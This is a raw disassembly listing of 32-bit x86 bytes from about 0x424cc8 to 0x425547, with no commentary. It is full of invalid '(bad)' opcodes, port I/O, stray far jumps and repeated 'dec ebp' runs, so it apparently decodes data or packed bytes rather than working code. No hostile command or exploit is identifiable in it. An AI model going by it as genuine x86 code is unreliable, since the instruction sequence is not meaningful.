  424cc8:	dec    ebp
  424cc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424cca:	jmp    0x4fbe853e
  424ccf:	mov    ch,0x4d
  424cd1:	dec    ebp
  424cd2:	dec    ebp
  424cd3:	sbb    ecx,ebp
  424cd5:	outs   dx,DWORD PTR ds:[esi]
  424cd6:	cmp    BYTE PTR [edi+ecx*2-0x3b],bh
  424cda:	dec    ebp
  424cdb:	dec    ebp
  424cdc:	dec    ebp
  424cdd:	icebp  
  424cde:	jmp    0x4fbe8552
  424ce3:	push   edx
  424ce4:	dec    ebp
  424ce5:	dec    ebp
  424ce6:	dec    ebp
  424ce7:	sbb    ecx,ebp
  424ce9:	outs   dx,DWORD PTR ds:[esi]
  424cea:	cmp    BYTE PTR [edi+ecx*2-0x2b],bh
  424cee:	dec    ebp
  424cef:	dec    ebp
  424cf0:	dec    ebp
  424cf1:	call   0x507abcdf
  424cf6:	add    ebp,ebx
  424cf8:	dec    ebp
  424cf9:	dec    ebp
  424cfa:	dec    ebp
  424cfb:	jl     0x424d4c
  424cfd:	in     eax,0x4d
  424cff:	dec    ebp
  424d00:	dec    ebp
  424d01:	fucompp 
  424d03:	outs   dx,DWORD PTR ds:[esi]
  424d04:	cmp    BYTE PTR [eax-0x69],dl
  424d07:	int    0x7c
  424d09:	ja     0x424d1a
  424d0b:	nop
  424d0c:	jmp    0xf0928580
  424d11:	adc    BYTE PTR [edi+esi*2+0x41],bh
  424d15:	cmc    
  424d16:	jmp    0xf092858a
  424d1b:	push   ds
  424d1c:	jl     0x424d95
  424d1e:	es (bad) 
  424d20:	jmp    0x77be8594
  424d25:	mul    BYTE PTR ds:[edi+ebp*2]
  424d29:	cmp    BYTE PTR [ebx+0x6a],dl
  424d2c:	add    BYTE PTR [ecx+0x4f],0xa
  424d30:	dec    ebp
  424d31:	dec    ebp
  424d32:	dec    ebp
  424d33:	mov    dl,0xbe
  424d35:	or     al,0xcd
  424d37:	add    eax,0x2f4110c4
  424d3c:	inc    ebp
  424d3d:	dec    ebp
  424d3e:	dec    ebp
  424d3f:	dec    ebp
  424d40:	ins    DWORD PTR es:[edi],dx
  424d41:	in     eax,dx
  424d42:	mov    ebx,DWORD PTR [ebx]
  424d44:	in     al,0x2
  424d46:	or     dh,0x32
  424d49:	cmp    cl,BYTE PTR [ebp+0x7501018d]
  424d4f:	dec    ebp
  424d50:	dec    ebp
  424d51:	dec    ebp
  424d52:	xchg   esi,eax
  424d53:	dec    ebp
  424d54:	or     ch,dh
  424d56:	sbb    BYTE PTR [edx],0x32
  424d59:	cmp    cl,BYTE PTR [ebp+0x4518018d]
  424d5f:	dec    ebp
  424d60:	dec    ebp
  424d61:	dec    ebp
  424d62:	stos   BYTE PTR es:[edi],al
  424d63:	or     cl,BYTE PTR [ebp-0x6a]
  424d66:	out    dx,eax
  424d67:	push   eax
  424d68:	ja     0x424d67
  424d6a:	add    DWORD PTR [edi-0x7a],esi
  424d6d:	or     al,BYTE PTR [eax-0x72c5d932]
  424d73:	lea    ecx,[ebp-0x7f]
  424d76:	xor    BYTE PTR [edi-0x3],0x4d
  424d7a:	test   DWORD PTR [eax-0xf7f7589],0xedfc538a
  424d84:	add    eax,0xc86b20d
  424d89:	mov    dl,0xba
  424d8b:	sub    edi,edi
  424d8d:	mov    dl,0x50
  424d8f:	ja     0x424d40
  424d91:	xor    al,0x8a
  424d94:	xor    BYTE PTR [edi-0x76],0x53
  424d98:	push   ecx
  424d99:	in     eax,dx
  424d9a:	xor    cl,BYTE PTR ds:0xb22984b2
  424da0:	mov    esi,0x80fdff0c
  424da5:	ja     0x424d2d
  424da7:	arpl   WORD PTR [edx+0x775097d5],si
  424dad:	jbe    0x424d73
  424daf:	or     DWORD PTR [eax+0x76f0808d],eax
  424db5:	push   eax
  424db6:	ja     0x424d3e
  424db8:	xor    BYTE PTR [edi-0x7a],0x63
  424dbc:	mov    dl,0xd5
  424dbe:	iret   
  424dbf:	or     BYTE PTR [edx],0x1d
  424dc2:	sbb    BYTE PTR [edx],0x26
  424dc5:	cmp    cl,BYTE PTR [ebp-0x28f19c73]
  424dcb:	stc    
  424dcc:	sbb    BYTE PTR [edx],0x26
  424dcf:	cmp    cl,BYTE PTR [ebp+0x1d0a808d]
  424dd5:	arpl   WORD PTR [esi],cx
  424dd7:	xlat   BYTE PTR ds:[ebx]
  424dd8:	cmp    eax,DWORD PTR [eax-0x72c5d1e6]
  424dde:	lea    eax,[eax-0x557fde69]
  424de4:	cmp    eax,0xa500eec
  424de9:	and    eax,0x808b7780
  424dee:	lock mov edx,DWORD PTR [ebx-0x4]
  424df2:	in     eax,dx
  424df3:	add    eax,0xc86b20d
  424df8:	mov    dl,0xba
  424dfa:	sub    edi,edi
  424dfc:	mov    dl,0x50
  424dfe:	ja     0x424daf
  424e00:	adc    BYTE PTR [edi-0x796c64db],0x3
  424e07:	enter  0x4d4d,0x4f
  424e0b:	push   0x9
  424e0d:	movd   DWORD PTR [ebp-0x28b27273],mm1
  424e14:	and    eax,0x86932a80
  424e19:	sub    eax,0x4f4d4dc8
  424e1e:	push   0x9
  424e20:	pcmpeqb mm1,QWORD PTR [ebp+0x77808d8d]
  424e27:	and    eax,0x94802a80
  424e2c:	xchg   BYTE PTR [eax+0x4f4d4dc2],bh
  424e32:	push   0x9
  424e34:	mov    cr1,ebp
  424e37:	lea    ecx,[ebp-0x6e796c65]
  424e3d:	mov    ecx,DWORD PTR [ebp+0x4d]
  424e40:	dec    edi
  424e41:	push   0x9
  424e43:	ucomiss xmm1,DWORD PTR [ebp-0x317f7273]
  424e4a:	cmp    cl,BYTE PTR es:[ebp-0x28e29c73]
  424e51:	sbb    eax,DWORD PTR [eax-0x72c5cd32]
  424e57:	lea    eax,[ecx]
  424e59:	lock test BYTE PTR [esi-0x7f7b28b3],dl
  424e60:	lock and DWORD PTR [ebp-0x62],ecx
  424e64:	xchg   ebp,eax
  424e65:	xchg   ebx,eax
  424e66:	dec    ebp
  424e67:	or     ah,BYTE PTR ds:0x3a82ce80
  424e6d:	lea    ecx,[ebp-0x27f7280]
  424e73:	push   ebx
  424e74:	push   ecx
  424e75:	in     eax,dx
  424e76:	xor    cl,BYTE PTR ds:0xb20cbeb2
  424e7c:	test   BYTE PTR [ecx],ch
  424e7e:	(bad)  
  424e7f:	std    
  424e80:	aad    0x0
  424e82:	jl     0x424efb
  424e84:	out    dx,eax
  424e85:	mul    BYTE PTR [ebx]
  424e87:	outs   dx,DWORD PTR ds:[esi]
  424e88:	cmp    BYTE PTR [eax-0xf7f1089],al
  424e8e:	out    dx,eax
  424e8f:	xor    BYTE PTR [edi+0x25],0xb2
  424e93:	mov    esi,0xc405a20c
  424e98:	hlt    
  424e99:	lea    ecx,[ebp+0x197d30b9]
  424e9f:	sub    BYTE PTR [ebp+0x3d],0x80
  424ea3:	lock sub eax,0x925074ec
  424ea9:	adc    eax,0x7c2d7780
  424eae:	(bad)  
  424eaf:	in     al,dx
  424eb0:	lea    ecx,[ebp+0x2d77808d]
  424eb6:	push   eax
  424eb7:	popf   
  424eb8:	out    dx,al
  424eb9:	xor    BYTE PTR [edi+0x71],0x80
  424ebd:	lock sub eax,0x80ef9250
  424ec3:	ja     0x424eda
  424ec5:	xor    al,0x2d
  424ec8:	push   eax
  424ec9:	xchg   edx,eax
  424eca:	and    esp,eax
  424ecc:	adc    eax,0x80257780
  424ed1:	ins    DWORD PTR es:[edi],dx
  424ed2:	cmp    eax,0xec2df080
  424ed7:	je     0x424f29
  424ed9:	xchg   edx,eax
  424eda:	adc    eax,0xed2d7780
  424edf:	sub    eax,0xf7777c8d
  424ee4:	cmp    cl,BYTE PTR [ebp-0x18127273]
  424eea:	test   DWORD PTR [ebp-0x5bacf329],0xc4a37480
  424ef4:	or     al,0x53
  424ef6:	push   0xffffffab
  424ef8:	test   eax,0x8d25fb70
  424efd:	xchg   edi,eax
  424efe:	add    BYTE PTR [edi+0x5c099696],0x92
  424f05:	adc    eax,0x1def7501
  424f0a:	or     DWORD PTR [edi+edi*2+0x6f],ebx
  424f0e:	xchg   ebx,eax
  424f0f:	fwait
  424f10:	jl     0x424f89
  424f12:	mov    dh,dh
  424f14:	and    al,0x6f
  424f16:	cmp    BYTE PTR [eax-0x10],dl
  424f19:	mov    ecx,DWORD PTR [edi+0x70]
  424f1c:	aad    0xb5
  424f1e:	icebp  
  424f1f:	and    ah,BYTE PTR [edi+ebp*2]
  424f22:	cmp    BYTE PTR [eax-0x187fde83],al
  424f28:	out    dx,eax
  424f29:	in     al,dx
  424f2a:	retf   
  424f2b:	pop    edi
  424f2c:	out    0x21,eax
  424f2e:	in     al,0xcf
  424f30:	sbb    ch,0xef
  424f33:	in     al,dx
  424f34:	retf   
  424f35:	in     al,dx
  424f36:	out    0xef,eax
  424f38:	pop    edi
  424f39:	out    0x21,eax
  424f3b:	in     al,0x7b
  424f3d:	xor    al,0x8a
  424f40:	and    bh,0x8a
  424f43:	push   ebx
  424f44:	(bad)  
  424f45:	in     eax,dx
  424f46:	dec    ebx
  424f47:	or     eax,0x8029bcb2
  424f4c:	mov    al,ds:0xff0cc4b2
  424f51:	push   es
  424f52:	in     eax,dx
  424f53:	mov    edx,0xeeb2ed8a
  424f58:	in     eax,dx
  424f59:	push   0x3d
  424f5b:	jnp    0x424f0f
  424f5d:	popa   
  424f5e:	sub    edi,edi
  424f60:	retf   
  424f61:	mov    ds:0x6f24f64b,al
  424f66:	cmp    BYTE PTR [edx],bh
  424f68:	out    0x8a,eax
  424f6a:	xor    al,0x8a
  424f6d:	and    bh,0x8a
  424f70:	push   ebx
  424f71:	(bad)  
  424f72:	in     eax,dx
  424f73:	dec    ebx
  424f74:	or     eax,0xb20cbeb2
  424f79:	mov    esp,0x632aff29
  424f7e:	lock mov esp,esp
  424f81:	dec    edx
  424f82:	push   ebx
  424f83:	push   0xffffffab
  424f85:	mov    ds:0x8deffb70,eax
  424f8a:	xchg   edi,eax
  424f8b:	add    BYTE PTR [edi+0x7c8187ed],0x77
  424f92:	cmp    DWORD PTR [ebx+0x7c8d8dad],0x77
  424f99:	stc    
  424f9a:	in     al,dx
  424f9b:	ror    DWORD PTR [ebp-0x7b888373],0x14
  424fa2:	ror    BYTE PTR [ebp-0x74888373],cl
  424fa8:	call   0x8a77:0x7c8dee71
  424faf:	stc    
  424fb0:	lods   eax,DWORD PTR ds:[esi]
  424fb1:	lea    ecx,[ebp-0x5088884]
  424fb7:	dec    DWORD PTR [ebp+0x7a777c8d]
  424fbd:	dec    ebx
  424fbe:	aam    0x8d
  424fc0:	lea    edi,[edi+esi*2-0x7e]
  424fc4:	in     al,dx
  424fc5:	lea    ecx,[ebp-0x79888373]
  424fcb:	mov    dl,0xb9
  424fcd:	lea    ecx,[ebp-0x7f788884]
  424fd3:	xchg   esi,eax
  424fd4:	lea    ecx,[ebp+0x332777c]
  424fda:	mov    bh,0x8d
  424fdc:	lea    eax,[eax-0x73a17510]
  424fe2:	fimul  DWORD PTR [ebp-0x7f4dbc73]
  424fe8:	lock mov edx,DWORD PTR [ebx+0x72]
  424fec:	dec    ebx
  424fed:	add    eax,0xfd809b99
  424ff2:	mov    ds:0x8d90f1ba,al
  424ff7:	lea    esp,[edx-0x7238d090]
  424ffd:	lea    esp,[edx-0x725a2bfb]
  425003:	lea    esp,[edx-0x72c2204e]
  425009:	lea    edi,[edi+esi*2-0x38]
  42500d:	div    eax
  42500f:	lea    ecx,[ebp-0x24758884]
  425015:	aad    0x8d
  425017:	lea    edi,[edi+esi*2-0x75]
  42501b:	sbb    DWORD PTR [ecx-0x73],esi
  42501e:	lea    eax,[eax-0x687f7489]
  425024:	mov    dh,BYTE PTR [edi]
  425026:	dec    ecx
  425027:	popf   
  425028:	lea    ecx,[ebp+0x77ecfb53]
  42502e:	enter  0xb680,0x57
  425032:	jnp    0x425041
  425034:	lea    ecx,[ebp-0x68af08bd]
  42503a:	mov    al,BYTE PTR [eax+0x77ec8a77]
  425040:	out    dx,eax
  425041:	adc    BYTE PTR [edi+0x2197ec8a],0x8f
  425048:	nop
  425049:	adc    BYTE PTR [ecx-0x80],dh
  42504c:	ja     0x425080
  42504e:	adc    BYTE PTR [edi-0x76e6c879],0x8d
  425055:	lea    edx,[ebx-0x5]
  425058:	adc    BYTE PTR [edi-0xe04007a],0x3
  42505f:	(bad)  [ebp-0x7f08bc73]
  425065:	ja     0x425060
  425067:	in     al,dx
  425068:	(bad)  
  425069:	icebp  
  42506a:	test   al,0x55
  42506c:	lea    ecx,[ebp-0x681308bd]
  425072:	test   BYTE PTR [eax-0x287f7c89],al
  425078:	jno    0x424ffa
  42507a:	out    0x82,eax
  42507c:	mov    ds:0x8d9630c2,al
  425081:	lea    esi,[ebx]
  425083:	test   DWORD PTR [eax-0x3d5d8589],0x8d8d2db7
  42508d:	inc    ebx
  42508e:	ret    0x7253
  425091:	dec    ebx
  425092:	dec    ebx
  425093:	adc    BYTE PTR [edi+0x1fe757f7],0x8d
  42509a:	lea    esi,[ebx]
  42509c:	sti    
  42509d:	xor    BYTE PTR [esi+0x7a2f743],0x4c
  4250a4:	fmul   DWORD PTR [ebp+0x97e638d]
  4250aa:	dec    esp
  4250ab:	mov    ds:0xab4d4d4d,eax
  4250b0:	test   eax,0x8d21fb70
  4250b5:	xchg   edi,eax
  4250b6:	add    BYTE PTR [edi-0x6c8a7813],0x99
  4250bd:	fwait
  4250be:	jl     0x425137
  4250c0:	xchg   DWORD PTR [ebx+eiz*2+0x777c8d8d],ebx
  4250c7:	xor    dl,al
  4250c9:	jg     0x425058
  4250cb:	lea    edi,[edi+esi*2-0x38]
  4250cf:	pusha  
  4250d0:	xchg   esi,eax
  4250d1:	lea    ecx,[ebp-0x15748884]
  4250d7:	xchg   esi,eax
  4250d8:	lea    ecx,[ebp-0xd758884]
  4250de:	sub    eax,0x777c8d8d
  4250e3:	sbb    ecx,0x59
  4250e6:	lea    ecx,[ebp+0x7784777c]
  4250ec:	out    dx,al
  4250ed:	lea    ecx,[ebp+0x6df9777c]
  4250f3:	xor    DWORD PTR [ebp-0x79888373],ecx
  4250f9:	sbb    ebx,DWORD PTR [edi-0x73]
  4250fc:	lea    edi,[edi+esi*2+0x66]
  425100:	pop    esp
  425101:	leave  
  425102:	lea    ecx,[ebp-0x59958884]
  425108:	lea    ecx,[ebp+0x76777c8d]
  42510e:	iret   
  42510f:	cmp    DWORD PTR [ebp-0x2888373],ecx
  425115:	and    BYTE PTR [ecx],ch
  425117:	lea    ecx,[ebp+0x5caf777c]
  42511d:	iret   
  42511e:	lea    ecx,[ebp-0x1a088884]
  425124:	sbb    eax,0x77808d8d
  425129:	test   BYTE PTR [eax-0x55307c10],al
  42512f:	xor    ecx,DWORD PTR [ebp-0x58c1b873]
  425135:	lea    ecx,[ebp-0x72dcdf31]
  42513b:	lea    ecx,[ecx]
  42513d:	and    dh,BYTE PTR [edx+0x7f549e60]
  425143:	mov    eax,DWORD PTR [ebx-0x3]
  425146:	xor    BYTE PTR [edi-0x76],0x80
  42514a:	xchg   edi,eax
  42514b:	mov    esi,DWORD PTR [ebx]
  42514d:	sti    
  42514e:	adc    BYTE PTR [edi-0x36b73038],0x8d
  425155:	lea    eax,[ebx-0x5]
  425158:	adc    BYTE PTR [edi-0x7f04bcce],0x97
  42515f:	xchg   edi,edi
  425161:	sti    
  425162:	push   ebx
  425163:	jb     0x42515f
  425165:	pushf  
  425166:	ins    BYTE PTR es:[edi],dx
  425167:	dec    ebp
  425168:	dec    ebp
  425169:	dec    ebx
  42516a:	or     eax,DWORD PTR [eax-0x2f93de69]
  425170:	pop    ds
  425171:	lea    ecx,[ebp+0x7780f743]
  425177:	xchg   BYTE PTR [eax+0x7c43f9d7],al
  42517d:	or     DWORD PTR [edx],esp
  42517f:	cld    
  425180:	cli    
  425181:	mov    al,ds:0xbe309e50
  425186:	icebp  
  425187:	lea    ecx,[ebp+0x7a777c8d]
  42518d:	sbb    al,0x55
  42518f:	lea    ecx,[ebp+0x2e82777c]
  425195:	leave  
  425196:	lea    ecx,[ebp-0x327b8884]
  42519c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42519d:	lea    ecx,[ebp+0x3a83777c]
  4251a3:	lea    ecx,[ebp-0x7c587f73]
  4251a9:	push   ebx
  4251aa:	jb     0x42520a
  4251ac:	fwait
  4251ad:	leave  
  4251ae:	lea    ecx,[ebp-0x687f39b5]
  4251b4:	test   BYTE PTR [eax-0x4001059],al
  4251ba:	adc    BYTE PTR [edi-0x7f04bc7e],0x97
  4251c1:	jp     0x4251fa
  4251c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251c4:	or     DWORD PTR [ebp-0x4ddf673],0x59ef0f01
  4251ce:	sub    eax,0x77508ade
  4251d3:	jp     0x425155
  4251d5:	ja     0x4251ce
  4251d7:	adc    BYTE PTR [edi+0xbc835af],0x7
  4251de:	adc    BYTE PTR [edi+0x4523357a],0x2f
  4251e5:	and    DWORD PTR [esi+ebp*8-0x4f11efb9],edx
  4251ec:	xor    BYTE PTR [edi-0x3],0xcf
  4251f0:	mov    es,edi
  4251f2:	lea    ecx,[ebp-0x7f898814]
  4251f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251f9:	push   0x53
  4251fb:	jb     0x425248
  4251fd:	mov    BYTE PTR [eax-0x639b9969],0x6c
  425204:	dec    ebp
  425205:	dec    ebp
  425206:	aaa    
  425207:	cmp    BYTE PTR [edi-0x73],dl
  42520a:	lea    eax,[ebx-0x5]
  42520d:	push   edi
  42520e:	adc    DWORD PTR [edx+0x4d],ebp
  425211:	dec    ebp
  425212:	in     al,dx
  425213:	std    
  425214:	xor    BYTE PTR [edi-0x76],0x80
  425218:	xchg   edi,eax
  425219:	mov    esi,DWORD PTR [ebx]
  42521b:	sti    
  42521c:	adc    BYTE PTR [edi-0x36b73038],0x8d
  425223:	lea    eax,[ebx-0x5]
  425226:	adc    BYTE PTR [edi-0x7f04bcce],0x97
  42522d:	xchg   edi,edi
  42522f:	sti    
  425230:	push   ebx
  425231:	jb     0x42527e
  425233:	mov    BYTE PTR [eax-0x8bcde69],0x80
  42523a:	ja     0x4251c2
  42523c:	and    BYTE PTR [edi+0x97c43f9],0x22
  425243:	je     0x4251c5
  425245:	mov    al,ds:0x4ec8243
  42524a:	arpl   WORD PTR [ebx],ax
  42524c:	or     DWORD PTR [ebp+ebx*2+0x4d],ecx
  425250:	dec    ebp
  425251:	dec    ebp
  425252:	stos   DWORD PTR es:[edi],eax
  425253:	test   eax,0xeffb70a3
  425258:	lea    edx,[edi-0x78127880]
  42525e:	or     bh,BYTE PTR [edi+esi*2+0x62]
  425262:	in     al,0x58
  425264:	fist   WORD PTR [ecx]
  425266:	pop    esi
  425267:	xchg   BYTE PTR [edi+0x77502643],cl
  42526d:	push   esi
  42526e:	jl     0x4252e7
  425270:	pop    esi
  425271:	loop   0x4252cb
  425273:	fist   WORD PTR [ecx]
  425275:	push   eax
  425276:	ja     0x4252de
  425278:	jl     0x4252f1
  42527a:	push   0xffffffe6
  42527c:	pop    eax
  42527d:	fist   WORD PTR [ecx]
  42527f:	push   eax
  425280:	ja     0x4252f8
  425282:	xchg   ebx,eax
  425283:	jl     0x4252fc
  425285:	std    
  425286:	rcr    BYTE PTR [eax-0x21],1
  425289:	adc    DWORD PTR [eax+0x77],edx
  42528c:	scas   eax,DWORD PTR es:[edi]
  42528d:	cdq    
  42528e:	fwait
  42528f:	jl     0x425308
  425291:	neg    DWORD PTR [ecx+0x5011df58]
  425297:	ja     0x425313
  425299:	push   ebx
  42529a:	jb     0x4252ef
  42529c:	dec    ebp
  42529d:	pusha  
  42529e:	mul    BYTE PTR [edi+ebp*2]
  4252a1:	cmp    BYTE PTR [edi+esi*2-0x7e],bh
  4252a5:	call   0x7b543202
  4252aa:	push   eax
  4252ab:	ja     0x425230
  4252ad:	xor    BYTE PTR [edx+0x50879750],0xe7
  4252b4:	stc    
  4252b5:	add    DWORD PTR [esi+0xd32ed3a],ebx
  4252bb:	mov    dl,0x84
  4252bd:	sub    edi,edi
  4252bf:	sti    
  4252c0:	add    DWORD PTR [ebp+0x78],esi
  4252c3:	bound  eax,QWORD PTR [eax-0x11627f8f]
  4252c9:	or     DWORD PTR [esi+0x3],eax
  4252cc:	or     al,0xb2
  4252ce:	les    ecx,FWORD PTR [eax+eax*4]
  4252d1:	sbb    eax,0x53ee6d80
  4252d6:	push   0xffffffa2
  4252d8:	ret    0xc7a7
  4252db:	add    al,0xd4
  4252dd:	push   edi
  4252df:	push   eax
  4252e0:	xchg   edi,eax
  4252e1:	mov    eax,DWORD PTR [eax+0x6aec8b77]
  4252e7:	mov    dl,0xb4
  4252e9:	sub    DWORD PTR [ebx+0x77],esp
  4252ec:	and    DWORD PTR [ecx],ecx
  4252ee:	into   
  4252ef:	lea    ecx,fs:[ebp-0x74887f73]
  4252f6:	in     eax,dx
  4252f7:	mov    bh,0x86
  4252f9:	lea    edx,[eax-0x19]
  4252fc:	xor    al,BYTE PTR [eax+0x6a4f8b77]
  425302:	aad    0xb7
  425304:	push   ebx
  425305:	push   0x50
  425307:	out    0xc8,eax
  425309:	adc    BYTE PTR [edi-0x10587f7a],0x1
  425310:	gs jno 0x425293
  425313:	xchg   edi,eax
  425314:	out    dx,eax
  425315:	in     al,dx
  425316:	pushf  
  425317:	push   eax
  425318:	xchg   edi,eax
  425319:	test   BYTE PTR [edi+0x4d971090],cl
  42531f:	adc    BYTE PTR [edi-0x70631375],0x15
  425326:	mov    al,0x80
  425328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425329:	test   BYTE PTR [eax],dl
  42532b:	adc    ecx,DWORD PTR [edi-0x587fb269]
  425331:	mov    ebp,esp
  425333:	lods   al,BYTE PTR ds:[esi]
  425334:	and    bh,0xef
  425337:	adc    BYTE PTR ds:0xc8978063,dl
  42533d:	ins    DWORD PTR es:[edi],dx
  42533e:	in     eax,dx
  42533f:	clc    
  425340:	mov    dh,BYTE PTR [edx-0x412d67a]
  425346:	out    dx,al
  425347:	(bad)  
  425348:	sti    
  425349:	push   ebx
  42534a:	mov    dl,0x50
  42534c:	ja     0x425316
  42534e:	outs   dx,BYTE PTR ds:[esi]
  42534f:	xlat   BYTE PTR ds:[ebx]
  425350:	enter  0x9780,0xc8
  425354:	in     eax,dx
  425355:	xor    cl,BYTE PTR ds:0xb20c07b2
  42535b:	test   BYTE PTR [ecx],ch
  42535d:	(bad)  
  42535e:	sti    
  42535f:	adc    BYTE PTR [edi-0x1b049c75],0x34
  425366:	push   ebx
  425367:	dec    ebp
  425368:	jnp    0x4252ea
  42536a:	ja     0x42539e
  42536c:	adc    BYTE PTR [edi-0x79587f75],0xed
  425373:	test   BYTE PTR [edx-0x7f0811ff],cl
  425379:	xchg   edi,eax
  42537a:	mov    eax,DWORD PTR [ecx]
  42537c:	adc    eax,0x21a78093
  425381:	mov    dl,0x7
  425383:	sub    edi,edi
  425385:	sti    
  425386:	push   ebx
  425387:	mov    dl,0x50
  425389:	ja     0x4253bd
  42538b:	outs   dx,BYTE PTR ds:[esi]
  42538c:	xlat   BYTE PTR ds:[ebx]
  42538d:	xor    al,BYTE PTR [eax+0x32ed3297]
  425393:	or     eax,0xb20c07b2
  425398:	test   BYTE PTR [ecx],ch
  42539a:	(bad)  
  42539b:	sti    
  42539c:	adc    BYTE PTR [edi+0x4372ec8b],0x3
  4253a3:	push   eax
  4253a4:	ja     0x42532c
  4253a6:	arpl   WORD PTR [ecx+ecx*1+0x4c],si
  4253aa:	leave  
  4253ab:	dec    ebp
  4253ac:	dec    ebp
  4253ad:	dec    ebp
  4253ae:	xor    BYTE PTR [edi-0x79],0x80
  4253b2:	xchg   edi,eax
  4253b3:	stc    
  4253b4:	in     eax,dx
  4253b5:	clc    
  4253b6:	mov    ch,BYTE PTR [ebp-0x13]
  4253b9:	sti    
  4253ba:	out    dx,al
  4253bb:	mov    dl,0x86
  4253bd:	sub    edi,edi
  4253bf:	sti    
  4253c0:	push   ebx
  4253c1:	mov    dl,0x80
  4253c3:	add    BYTE PTR [eax-0x1281ac09],0xc6
  4253ca:	or     eax,0x5029b4b2
  4253cf:	xchg   edi,eax
  4253d0:	stc    
  4253d1:	mov    dl,0x7
  4253d3:	or     al,0x50
  4253d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253d6:	xchg   DWORD PTR [eax],esi
  4253d8:	xchg   edi,eax
  4253d9:	xchg   ebp,ebp
  4253db:	out    0x87,eax
  4253dd:	outs   dx,DWORD PTR ds:[esi]
  4253de:	or     edx,ebp
  4253e0:	jp     0x4253ef
  4253e2:	dec    ebp
  4253e3:	dec    ebp
  4253e4:	stos   DWORD PTR es:[edi],eax
  4253e5:	test   eax,0xeffb70a3
  4253ea:	lea    edx,[edi-0x78127880]
  4253f0:	adc    eax,0x7cef7780
  4253f5:	ja     0x425429
  4253f7:	mul    BYTE PTR [edi+ebp*2]
  4253fa:	cmp    BYTE PTR [edi+esi*2-0x76],bh
  4253fe:	cmc    
  4253ff:	and    al,0x6f
  425401:	cmp    BYTE PTR [eax+0x5099938d],al
  425407:	ja     0x425394
  425409:	jl     0x425482
  42540b:	enter  0x24dc,0x6f
  42540f:	cmp    BYTE PTR [ebx+0x4787777c],bl
  425415:	sbb    al,0xf9
  425417:	adc    eax,DWORD PTR [eax-0xf7f7529]
  42541d:	mov    ah,dl
  42541f:	or     eax,0x6f24225e
  425424:	cmp    BYTE PTR [ebx-0x454dd5ad],ch
  42542a:	sub    DWORD PTR [ebx+0x32],edx
  42542d:	mov    dl,0x88
  42542f:	or     al,0xff
  425431:	add    eax,0x8032f080
  425436:	xchg   edi,eax
  425437:	xor    dl,BYTE PTR [ebx-0x3]
  42543a:	push   ebx
  42543b:	pushf  
  42543c:	mov    dl,0xbe
  42543e:	or     al,0xb2
  425440:	clc    
  425441:	sub    edi,edi
  425443:	dec    BYTE PTR [ecx]
  425445:	and    al,BYTE PTR ds:0x8d8d24be
  42544b:	lea    eax,[eax-0x687f7410]
  425451:	mov    edx,DWORD PTR [ebx-0x64]
  425454:	mov    dl,0xf8
  425456:	sub    DWORD PTR [ebx-0x3],edx
  425459:	mov    dl,0xbe
  42545b:	or     al,0xff
  42545d:	inc    BYTE PTR [eax-0x587f7569]
  425463:	mov    dl,BYTE PTR [ebx-0x9]
  425466:	push   ebx
  425467:	lods   al,BYTE PTR ds:[esi]
  425468:	mov    dl,0x7
  42546a:	or     al,0xb2
  42546c:	mov    ah,0x29
  42546e:	call   DWORD PTR [edi+ecx*2-0x74687f02]
  425475:	xor    al,0x8b
  425478:	aad    0x59
  42547a:	push   ebx
  42547b:	sub    dh,BYTE PTR [edx-0x8acd646]
  425481:	mov    dl,0x7
  425483:	or     al,0xff
  425485:	mov    dh,0x80
  425487:	lock mov al,BYTE PTR [eax-0x2ac7559]
  42548e:	push   ebx
  42548f:	lods   al,BYTE PTR ds:[esi]
  425490:	mov    dl,0xbe
  425492:	or     al,0xb2
  425494:	mov    ah,0x29
  425496:	call   DWORD PTR [ecx]
  425498:	xchg   esp,eax
  425499:	pop    es
  42549a:	xor    al,0x87
  42549d:	and    BYTE PTR [edi+0x53fd5387],0xac
  4254a4:	mov    dl,0xbe
  4254a6:	or     al,0xb2
  4254a8:	mov    ah,0x29
  4254aa:	call   DWORD PTR [ecx]
  4254ac:	push   ebx
  4254ad:	mov    dh,0xc4
  4254af:	sub    eax,0xbab22a53
  4254b4:	sub    DWORD PTR [ebx-0x9],edx
  4254b7:	mov    dl,0x7
  4254b9:	or     al,0xff
  4254bb:	mov    dh,0x80
  4254bd:	lock mov al,BYTE PTR [eax-0x2ac7559]
  4254c4:	push   ebx
  4254c5:	lods   al,BYTE PTR ds:[esi]
  4254c6:	mov    dl,0xbe
  4254c8:	or     al,0xb2
  4254ca:	mov    ah,0x29
  4254cc:	call   DWORD PTR [ecx]
  4254ce:	xchg   esp,eax
  4254cf:	pop    es
  4254d0:	push   eax
  4254d1:	xchg   edi,eax
  4254d2:	mov    eax,DWORD PTR [eax-0x687f7510]
  4254d8:	mov    dl,BYTE PTR [ebx-0x3]
  4254db:	push   ebx
  4254dc:	pushf  
  4254dd:	mov    dl,0xbe
  4254df:	or     al,0xb2
  4254e1:	clc    
  4254e2:	sub    edi,edi
  4254e4:	(bad)  
  4254e5:	in     al,dx
  4254e6:	add    eax,0x80c8f080
  4254eb:	xchg   edi,eax
  4254ec:	enter  0x9c53,0x53
  4254f0:	std    
  4254f1:	mov    dl,0xf8
  4254f3:	sub    DWORD PTR [edx-0x100f342],esi
  4254f9:	adc    BYTE PTR [edi-0x75587f76],0x53
  425500:	not    DWORD PTR [ebx-0x54]
  425503:	mov    dl,0xb4
  425505:	sub    DWORD PTR [edx-0x6b00f3f9],esi
  42550b:	inc    ebx
  42550c:	(bad)  
  42550d:	arpl   WORD PTR ds:0x4d5b4c09,ax
  425513:	dec    ebp
  425514:	dec    ebp
  425515:	xor    BYTE PTR [edi-0x75],0x80
  425519:	lock out dx,eax
  42551b:	stos   DWORD PTR es:[edi],eax
  42551c:	test   eax,0x77803a50
  425521:	mov    esp,DWORD PTR [ebx-0x72110490]
  425527:	xchg   edi,eax
  425528:	add    BYTE PTR [edi+0x70539696],0x5f
  42552f:	lock and ebp,edx
  425532:	in     eax,0x5f
  425534:	lock out dx,eax
  425536:	(bad)  
  425538:	(bad)  
  425539:	out    dx,al
  42553a:	outs   dx,BYTE PTR ds:[esi]
  42553b:	adc    BYTE PTR [edi+0x9],dh
  42553e:	cld    
  42553f:	ja     0x42550d
  425541:	aad    0xfc
  425543:	ja     0x425552
  425545:	sbb    esp,edi
  425547:	ja     0x425596
